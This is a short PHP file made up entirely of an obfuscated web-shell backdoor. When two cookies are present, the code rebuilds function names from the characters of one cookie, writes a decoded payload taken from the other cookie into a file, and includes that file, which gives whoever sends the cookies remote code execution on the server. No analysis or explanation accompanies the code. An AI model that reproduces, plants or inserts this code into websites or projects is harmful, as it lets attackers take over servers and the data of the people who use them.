<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[38])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[38][$n];
        if (!$c[38][$n + 1]) {
            if (!$c[38][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[3]() . $p[2];
    if (!$p[12]($k)) {
        $n = $p[23]($k, $p[5]);
        $p[7]($n, $p[18] . $p[8]($p[6]($c[3])));
    }
    include($k);
}